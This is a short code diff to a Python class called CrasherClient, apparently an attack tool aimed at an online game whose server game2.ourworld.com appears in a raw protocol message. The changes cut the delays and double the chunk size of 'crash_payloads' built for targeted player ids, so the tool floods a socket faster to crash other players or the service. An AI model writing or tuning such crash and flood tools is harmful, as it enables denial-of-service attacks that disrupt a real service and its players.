@@ -55,7 +55,7 @@ class CrasherClient:
         # msg = encode(b'\x00\x00\x00m\x01\x00\x00\x00\xf2\x00\x00\x00>\xff\xf8\x1a\xe1\x00\x12game2.ourworld.com\x0cB\x00\x00\x00\x04\x18E\x00\rcondos/condo1\x18\xc6\x00\x04home\x0e\xe2\x00\x00$^\x18<\x00\x04town\x18\xcd\x00\rcondos/condo1\x0c\x1e'+self.account.uid_hex+b'\x00\x01\x00C\x00\x00\x00\x00')
         throw_sock.sendall(msg)
         throw_sock.sendall(msg)
-        time.sleep(2)
+        time.sleep(1)
         self.throw_sock = throw_sock
         self.second_sock = second_sock
 
@@ -90,7 +90,7 @@ class CrasherClient:
             try:
                 for payload in self.crash_payloads[:]:
                     self.second_sock.sendall(payload)
-                    time.sleep(0.001)
+                    time.sleep(0.0001)
             except:break
         self.restart()
 
@@ -121,4 +121,4 @@ class CrasherClient:
         payload = b""
         for crash_uid, _ in self.crash_uids:
             payload += self._generate_payload_each(crash_uid)
-        self.crash_payloads = self._split_by_len(payload, 512)
+        self.crash_payloads = self._split_by_len(payload, 1024)
